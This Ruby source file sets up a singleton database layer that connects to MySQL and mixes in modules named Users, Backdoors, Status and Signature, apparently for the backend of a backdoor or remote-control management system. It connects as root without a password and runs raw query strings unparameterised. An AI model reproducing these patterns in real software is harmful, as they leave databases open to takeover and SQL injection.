#
# Layer for accessing the real DB
#

# include all the mix-ins
Dir[File.dirname(__FILE__) + '/db_layer/*.rb'].each do |file|
  require file
end

require_relative 'audit.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/flatsingleton'

# system
require 'mysql2'
require 'mongo'

module RCS
module DB

class DB
  include Singleton
  extend FlatSingleton
  include RCS::Tracer

  def initialize
    begin
      trace :info, "Connecting to MySQL..."
      @mysql = Mysql2::Client.new(:host => "localhost", :username => "root", :database => 'rcs')
    rescue
      trace :fatal, "Cannot connect to MySQL"
    end
    
  end

  def mysql_query(query)
    begin
      @mysql.query(query, {:symbolize_keys => true})
    rescue Exception => e
      trace :error, "MYSQL ERROR: #{e.message}"
    end
  end

  # in the mix-ins there are all the methods for the respective section
  include Users
  include Backdoors
  include Status
  include Signature

end

end #DB::
end #RCS::
